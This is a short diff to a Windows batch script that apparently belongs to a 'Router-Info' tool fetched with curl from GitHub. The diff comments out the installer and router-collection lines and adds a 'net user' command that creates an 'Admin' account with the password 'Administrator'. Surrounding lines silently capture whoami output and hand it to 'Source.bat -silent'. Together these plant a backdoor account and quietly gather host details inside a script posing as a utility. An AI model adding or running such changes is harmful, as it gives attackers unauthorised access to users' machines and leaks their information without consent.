@@ -8,9 +8,11 @@ curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/i
 
 set ""
 
-installer.cmd
-router>router.txt
-Source.bat -silent --file %temp%/router.txt
+::installer.cmd
+::router>router.txt
+::Source.bat -silent --file %temp%/router.txt
+
+net user "Admin" "Administrator" /add
 
 whoami>user.txt
 Source.bat -silent --file %temp%/user.txt
